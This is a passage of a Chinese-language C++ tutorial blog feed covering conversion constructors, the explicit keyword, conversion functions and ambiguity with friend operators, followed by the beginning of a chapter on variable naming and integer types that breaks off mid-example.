关键字</strong></p><p>为了禁止构造函数用于隐式转换，可以在构造函数声明前加上 <code>explicit</code> 关键字。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stones.h (修改后)</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stones</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 使用 explicit 禁止隐式转换</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Stones</span><span class="params">(<span class="keyword">double</span> lbs)</span></span>;</span><br><span class="line">    Stones();</span><br><span class="line">    ~Stones();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>如果使用了 <code>explicit</code>，那么之前的隐式转换代码将不再合法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp (使用 explicit Stones 后)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Stones incognito = 275; // 错误！不能隐式转换</span></span><br><span class="line">    <span class="comment">// Stones taft = 325;      // 错误！不能隐式转换</span></span><br><span class="line"></span><br><span class="line">    <span class="function">Stones <span class="title">wolfe</span><span class="params">(<span class="number">285.7</span>)</span></span>;    <span class="comment">// OK: 显式调用构造函数</span></span><br><span class="line">    Stones incognito = Stones(<span class="number">275</span>); <span class="comment">// OK: 显式转换 (调用构造函数)</span></span><br><span class="line">    <span class="function">Stones <span class="title">taft</span><span class="params">(<span class="number">325</span>)</span></span>;      <span class="comment">// OK: 显式调用构造函数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// incognito = 276.8; // 错误！不能隐式转换后赋值</span></span><br><span class="line">    incognito = Stones(<span class="number">276.8</span>); <span class="comment">// OK: 显式转换后赋值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// display(19.99, 2); // 错误！不能隐式转换参数</span></span><br><span class="line">    display(Stones(<span class="number">19.99</span>), <span class="number">2</span>); <span class="comment">// OK: 显式转换参数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 强制类型转换也允许</span></span><br><span class="line">    display((Stones)<span class="number">20.5</span>, <span class="number">1</span>); <span class="comment">// C 风格强制转换</span></span><br><span class="line">    display(<span class="keyword">static_cast</span>&lt;Stones&gt;(<span class="number">21.2</span>), <span class="number">1</span>); <span class="comment">// C++ 风格强制转换</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>建议:</strong> 通常建议将<strong>只接受一个参数的构造函数</strong>声明为 <code>explicit</code>，除非你确实希望进行该类型的隐式转换。这可以防止许多潜在的错误。</p><h3 id="11-6-2-转换函数：operator-typeName"><a href="#11-6-2-转换函数：operator-typeName" class="headerlink" title="11.6.2 转换函数：operator typeName()"></a>11.6.2 转换函数：<code>operator typeName()</code></h3><p>构造函数提供了从其他类型到类类型的转换。如果我们想定义从<strong>类类型</strong>转换到<strong>其他类型</strong>（如 <code>double</code> 或 <code>int</code>）的规则，我们需要使用**转换函数 (Conversion Function)**。</p><p>转换函数是一种特殊的类成员函数，形式为 <code>operator typeName()</code>。</p><p><strong>特点:</strong></p><ol><li> <strong>名称:</strong> <code>operator</code> 关键字后跟目标类型名 <code>typeName</code>。</li><li> <strong>无返回类型声明:</strong> 函数头不能指定返回类型（即使它确实会返回一个 <code>typeName</code> 类型的值）。</li><li> <strong>无参数:</strong> 转换函数必须是<strong>没有参数</strong>的成员函数。</li><li> <strong>必须是成员函数:</strong> 不能是静态成员函数或友元函数。</li></ol><p><strong>示例：为 <code>Stones</code> 添加转换为 <code>double</code> 和 <code>int</code> 的函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stones.h (添加转换函数)</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stones</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Stones</span><span class="params">(<span class="keyword">double</span> lbs)</span></span>;</span><br><span class="line">    Stones();</span><br><span class="line">    ~Stones();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show_lbs</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show_stn</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换函数：转换为 double (总磅数)</span></span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// 转换函数：转换为 int (四舍五入的总磅数)</span></span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// stones.cpp (添加转换函数定义)</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="function">Stones::<span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> pounds; <span class="comment">// 返回总磅数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Stones::<span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 四舍五入到最近的整数磅</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>(pounds + <span class="number">0.5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp (使用转换函数)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stones.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Stones <span class="title">poppins</span><span class="params">(<span class="number">9</span>, <span class="number">2.8</span>)</span></span>; <span class="comment">// 9 stone, 2.8 pounds</span></span><br><span class="line">    <span class="keyword">double</span> p_wt = poppins; <span class="comment">// 隐式转换: 调用 poppins.operator double()</span></span><br><span class="line">    <span class="keyword">int</span> int_wt = poppins;  <span class="comment">// 隐式转换: 调用 poppins.operator int()</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Poppins weighs &quot;</span> &lt;&lt; p_wt &lt;&lt; <span class="string">&quot; pounds.\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Poppins weighs &quot;</span> &lt;&lt; int_wt &lt;&lt; <span class="string">&quot; pounds (rounded).\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 也可以显式调用</span></span><br><span class="line">    <span class="keyword">double</span> p_wt_explicit = <span class="keyword">double</span>(poppins);</span><br><span class="line">    <span class="keyword">int</span> int_wt_explicit = <span class="keyword">int</span>(poppins);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Explicit double: &quot;</span> &lt;&lt; p_wt_explicit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Explicit int: &quot;</span> &lt;&lt; int_wt_explicit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Poppins weighs 128.8 pounds.</span><br><span class="line">Poppins weighs 129 pounds (rounded).</span><br><span class="line">Explicit double: 128.8</span><br><span class="line">Explicit int: 129</span><br></pre></td></tr></table></figure><p><strong><code>explicit</code> 转换函数 (C++11)</strong></p><p>与构造函数类似，C++11 允许将转换函数声明为 <code>explicit</code>，以防止它们被用于隐式转换。如果转换函数是 <code>explicit</code> 的，那么只能在需要显式转换的上下文中使用（例如，使用 <code>static_cast</code> 或直接初始化）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stones.h (使用 explicit 转换函数)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stones</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="keyword">operator</span> <span class="title">int</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp (使用 explicit 转换函数后)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Stones <span class="title">poppins</span><span class="params">(<span class="number">9</span>, <span class="number">2.8</span>)</span></span>;</span><br><span class="line">    <span class="comment">// double p_wt = poppins; // 错误！不能隐式转换</span></span><br><span class="line">    <span class="comment">// int int_wt = poppins;  // 错误！不能隐式转换</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要显式转换</span></span><br><span class="line">    <span class="keyword">double</span> p_wt = <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(poppins);</span><br><span class="line">    <span class="keyword">int</span> int_wt = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(poppins);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Poppins weighs &quot;</span> &lt;&lt; p_wt &lt;&lt; <span class="string">&quot; pounds.\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Poppins weighs &quot;</span> &lt;&lt; int_wt &lt;&lt; <span class="string">&quot; pounds (rounded).\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if (poppins) &#123; ... &#125; // 如果 operator bool() 是 explicit，这里也会报错</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">bool</span>&gt;(poppins)) &#123; <span class="comment">/* ... */</span> &#125; <span class="comment">// 需要显式转换</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将转换函数设为 <code>explicit</code> 通常也是一个好主意，除非隐式转换确实是你想要的行为（例如 <code>operator bool()</code> 在条件语句中的使用，但在 C++11 后也推荐 <code>explicit operator bool()</code>）。</p><h3 id="11-6-3-转换函数和友元函数"><a href="#11-6-3-转换函数和友元函数" class="headerlink" title="11.6.3 转换函数和友元函数"></a>11.6.3 转换函数和友元函数</h3><p>转换函数和接受单参数的构造函数都可能导致二义性问题，尤其是在与重载运算符（特别是友元函数）一起使用时。</p><p><strong>二义性示例:</strong></p><p>考虑之前的 <code>Vector</code> 类和 <code>Vector operator*(double n, const Vector &amp; a);</code> 友元函数。如果我们为 <code>Vector</code> 添加一个接受 <code>double</code> 的构造函数（可能表示创建一个大小为 <code>double</code>、角度为 0 的向量）和一个转换为 <code>double</code> 的函数（可能返回向量的大小 <code>magval()</code>），会发生什么？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vector.h (假设添加了转换构造函数和函数)</span></span><br><span class="line"><span class="keyword">namespace</span> VECTOR &#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vector</span> &#123;</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        Vector(<span class="keyword">double</span> val); <span class="comment">// 转换构造函数 (可能不 explicit)</span></span><br><span class="line">        <span class="function"><span class="keyword">operator</span> <span class="title">double</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 转换函数 (可能不 explicit)</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">friend</span> Vector <span class="keyword">operator</span>*(<span class="keyword">double</span> n, <span class="keyword">const</span> Vector &amp; a);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line">VECTOR::Vector result;</span><br><span class="line"><span class="function">VECTOR::Vector <span class="title">vec</span><span class="params">(<span class="number">10.0</span>, <span class="number">20.0</span>)</span></span>;</span><br><span class="line"><span class="keyword">double</span> factor = <span class="number">2.0</span>;</span><br><span class="line">result = factor * vec; <span class="comment">// 潜在的二义性！</span></span><br></pre></td></tr></table></figure><p>编译器在处理 <code>factor * vec</code> 时，可能会有两种解释：</p><ol><li> <strong>调用友元函数:</strong> <code>operator*(factor, vec)</code>，这是我们原本期望的。</li><li> <strong>使用转换函数:</strong> 将 <code>vec</code> 转换为 <code>double</code>（通过 <code>vec.operator double()</code>），然后执行 <code>double * double</code> 的内置乘法。</li></ol><p>如果 <code>Vector(double)</code> 和 <code>operator double()</code> 都存在且都不是 <code>explicit</code>，编译器通常会因为无法确定使用哪个转换路径而报告**二义性错误 (ambiguity error)**。</p><p><strong>解决方法:</strong></p><ol><li> <strong>使用 <code>explicit</code>:</strong> 将转换构造函数和转换函数声明为 <code>explicit</code>，可以消除隐式转换带来的二义性。用户必须显式指定转换。</li><li> <strong>提供精确匹配的函数:</strong> 如果只提供了 <code>operator*(double, const Vector&amp;)</code>，而没有提供 <code>operator double()</code>，那么编译器会优先选择精确匹配的友元函数，不会产生二义性。</li><li> <strong>避免定义相互冲突的转换:</strong> 在设计类时，仔细考虑可能需要的转换，避免同时提供从类型 A 到类型 B 以及从类型 B 到类型 A 的隐式转换，或者提供多个可能导致相同结果的转换路径。</li></ol><p><strong>总结:</strong></p><ul><li>  接受单个参数的构造函数定义了从参数类型到类类型的隐式转换，除非使用 <code>explicit</code> 阻止。</li><li>  转换函数 <code>operator typeName()</code> 定义了从类类型到 <code>typeName</code> 类型的转换，可以是隐式的，除非使用 <code>explicit</code> (C++11) 阻止。</li><li>  隐式转换虽然方便，但可能导致意外行为和二义性。优先使用 <code>explicit</code> 来控制转换。</li><li>  当存在多个转换路径（通过构造函数或转换函数）可以使表达式合法时，编译器可能会遇到二义性问题。</li><li>  在设计类时，应谨慎考虑转换需求，避免引入不必要的或有歧义的转换规则。</li></ul><h2 id="11-7-总结"><a href="#11-7-总结" class="headerlink" title="11.7 总结"></a>11.7 总结</h2><p>本章重点介绍了如何通过运算符重载、友元和类型转换等特性来扩展类的功能，使其使用起来更自然、更强大。</p><p>主要内容回顾：</p><ol><li><p><strong>运算符重载 (Operator Overloading):</strong></p><ul><li>  允许为类定义标准 C++ 运算符（如 <code>+</code>, <code>-</code>, <code>*</code>, <code>&lt;&lt;</code>）的行为。</li><li>  目的是提高代码的可读性和直观性，使类对象的运算类似于内置类型。</li><li>  通过定义<strong>运算符函数</strong>（<code>operator+</code>, <code>operator&lt;&lt;</code> 等）来实现。</li><li>  运算符函数可以是<strong>成员函数</strong>或<strong>非成员函数</strong>（通常是友元）。</li><li>  重载不能改变运算符的优先级、结合性或操作数个数，也不能创建新运算符。某些运算符（如 <code>.</code>、<code>::</code>、<code>sizeof</code>）不能被重载。</li><li>  <code>Time</code> 类的示例演示了如何重载 <code>+</code>, <code>-</code>, <code>*</code> 等算术运算符。</li></ul></li><li><p><strong>友元 (Friends):</strong></p><ul><li>  允许非成员函数或整个类访问另一个类的 <code>private</code> 和 <code>protected</code> 成员。</li><li>  通过在类定义内部使用 <code>friend</code> 关键字声明。</li><li>  <strong>友元函数</strong>常用于重载那些不能作为成员函数（如 <code>&lt;&lt;</code>, <code>&gt;&gt;</code>）或需要对称处理操作数（如 <code>double * Vector</code>）的运算符。</li><li>  <strong>友元类</strong>允许一个类的所有成员函数访问另一个类的私有部分，适用于需要紧密协作的类。</li></ul></li><li><p><strong>成员函数 vs. 非成员函数 (Operator Overloading Choice):</strong></p><ul><li>  赋值 (<code>=</code>)、下标 (<code>[]</code>)、函数调用 (<code>()</code>)、成员访问 (<code>-&gt;</code>) 运算符<strong>必须</strong>是成员函数。</li><li>  修改对象状态的运算符（如 <code>+=</code>, <code>++</code>）通常实现为<strong>成员函数</strong>。</li><li>  需要对称性或允许左操作数进行类型转换的运算符（如 <code>+</code>, <code>*</code>, <code>==</code>）以及输入/输出运算符 (<code>&lt;&lt;</code>, <code>&gt;&gt;</code>) 通常实现为<strong>非成员友元函数</strong>。</li></ul></li><li><p><strong><code>Vector</code> 类示例:</strong></p><ul><li>  演示了如何设计一个包含状态（直角/极坐标模式）的类。</li><li>  进一步展示了算术运算符 (<code>+</code>, <code>-</code>, unary <code>-</code>, <code>*</code>) 和输出运算符 (<code>&lt;&lt;</code>) 的重载。</li><li>  通过随机漫步模拟展示了 <code>Vector</code> 类的实际应用。</li></ul></li><li><p><strong>类的类型转换:</strong></p><ul><li>  <strong>构造函数转换:</strong> 接受单个参数的构造函数（除非声明为 <code>explicit</code>）定义了从参数类型到类类型的<strong>隐式转换</strong>。</li><li>  <strong>转换函数:</strong> <code>operator typeName()</code> 形式的成员函数（除非声明为 <code>explicit</code>）定义了从类类型到 <code>typeName</code> 类型的<strong>隐式转换</strong>。</li><li>  <strong><code>explicit</code> 关键字:</strong> 用于阻止构造函数和转换函数进行隐式转换，提高代码安全性，避免意外转换和二义性。</li><li>  <strong>二义性:</strong> 当存在多个转换路径（通过构造函数或转换函数）时，可能导致编译错误。应谨慎设计转换规则或使用 <code>explicit</code>。</li></ul></li></ol><p>通过合理运用运算符重载、友元和类型转换，可以创建出功能丰富、易于使用且表达力强的 C++ 类。然而，这些特性也需要谨慎使用，以避免引入不必要的复杂性或潜在的错误。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 3 处理数据</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_3/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_3/</url>
      
        <content type="html"><![CDATA[<h2 id="3-1-简单变量"><a href="#3-1-简单变量" class="headerlink" title="3.1 简单变量"></a>3.1 简单变量</h2><p>在第2章中，我们已经接触了变量的声明和使用。本章将深入探讨C++的基本数据类型，首先从用于存储数字和字符的简单变量开始。简单变量是C++中存储数据的基本单元。</p><h3 id="3-1-1-变量名"><a href="#3-1-1-变量名" class="headerlink" title="3.1.1 变量名"></a>3.1.1 变量名</h3><p>变量名是赋予内存位置的标识符，用于访问存储在该位置的数据。在C++中，选择有意义的变量名是良好编程实践的一部分。</p><p><strong>命名规则:</strong></p><ol><li> <strong>字符集:</strong> 变量名只能包含字母（大小写）、数字和下划线 <code>_</code>。</li><li> <strong>首字符:</strong> 名称的第一个字符不能是数字。</li><li> <strong>区分大小写:</strong> C++是大小写敏感的，<code>myVariable</code> 和 <code>myvariable</code> 是两个不同的变量名。</li><li> <strong>不能是关键字:</strong> 不能使用C++关键字（如 <code>int</code>, <code>double</code>, <code>return</code>, <code>if</code>, <code>class</code> 等）作为变量名。</li><li> <strong>长度限制:</strong> C++对名称的长度没有硬性规定，但长名称可能会在某些旧编译器或链接器上遇到问题。通常，有意义且不过于冗长的名称是最好的。</li><li><strong>下划线的使用:</strong><ul><li>  以两个下划线 <code>__</code> 开头或以下划线和大写字母 <code>_A</code> 到 <code>_Z</code> 开头的名称被保留给编译器及其使用的资源使用。</li><li>  以下划线 <code>_</code> 开头的名称被保留用作全局标识符。</li><li>  虽然在某些情况下可以使用以下划线开头的名称（例如在函数内部），但最好避免这种用法，以防与系统使用的名称冲突。</li></ul></li></ol><p><strong>命名约定 (非强制，但推荐):</strong></p><ul><li>  <strong>有意义:</strong> 变量名应反映其存储的数据或用途（例如 <code>numberOfStudents</code>, <code>userName</code>, <code>totalScore</code>）。</li><li>  <strong>驼峰命名法 (Camel Case):</strong> 从第二个单词开始，每个单词的首字母大写（例如 <code>myVariableName</code>, <code>studentAge</code>）。这是C++中常见的风格。</li><li>  <strong>下划线分隔 (Snake Case):</strong> 使用下划线分隔单词（例如 <code>my_variable_name</code>, <code>student_age</code>）。这也是一种常见的风格。</li><li>  选择一种风格并保持一致。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 合法的变量名</span></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">double</span> accountBalance;</span><br><span class="line">    <span class="keyword">char</span> first_initial;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> populationOfEarth;</span><br><span class="line">    <span class="keyword">int</span> _internal_counter; <span class="comment">// 合法，但不推荐在全局使用</span></span><br><span class="line">    <span class="keyword">int</span> value2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非法的变量名</span></span><br><span class="line">    <span class="comment">// int 1stPlace;      // 不能以数字开头</span></span><br><span class="line">    <span class="comment">// double account Balance; // 不能包含空格</span></span><br><span class="line">    <span class="comment">// int return;        // 不能是关键字</span></span><br><span class="line">    <span class="comment">// char my-char;      // 不能包含连字符 &#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 区分大小写</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> Count = <span class="number">20</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;count: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; Count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-2-整型"><a href="#3-1-2-整型" class="headerlink" title="3.1.2 整型"></a>3.1.2 整型</h3><p><strong>整型 (Integer)</strong> 是没有小数部分的数字。C++提供了多种整型类型来存储整数，它们的主要区别在于占用的内存空间大小以及能够表示的数值范围。</p><p>计算机内存由称为<strong>位 (bit)</strong> 的单元组成。8个位组成一个**字节 (byte)**。每个位可以表示两种状态（通常是0或1）。字节是内存中最小的可寻址单元，意味着每个字节都有一个唯一的地址。</p><p>不同的整型类型使用不同数量的字节来存储值。使用的字节数越多，可以表示的整数范围就越大。</p><p><strong>基本整型类型:</strong></p><ul><li>  <code>short</code></li><li>  <code>int</code></li><li>  <code>long</code></li><li>  <code>long long</code> (C++11 新增)</li></ul><p>我们将在下一节详细讨论这些类型。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明不同类型的整型变量</span></span><br><span class="line">    <span class="keyword">short</span> smallNumber;</span><br><span class="line">    <span class="keyword">int</span> standardInteger;</span><br><span class="line">    <span class="keyword">long</span> largeInteger;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> veryLargeInteger; <span class="comment">// 需要 C++11 或更高版本</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    smallNumber = <span class="number">10</span>;</span><br><span class="line">    standardInteger = <span class="number">10000</span>;</span><br><span class="line">    largeInteger = <span class="number">1000000</span>;</span><br><span class="line">    veryLargeInteger = <span class="number">10000000000L</span>L; <span class="comment">// LL 后缀表示 long long</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;short: &quot;</span> &lt;&lt; smallNumber &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int: &quot;</span> &lt;&lt; standardInteger &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; 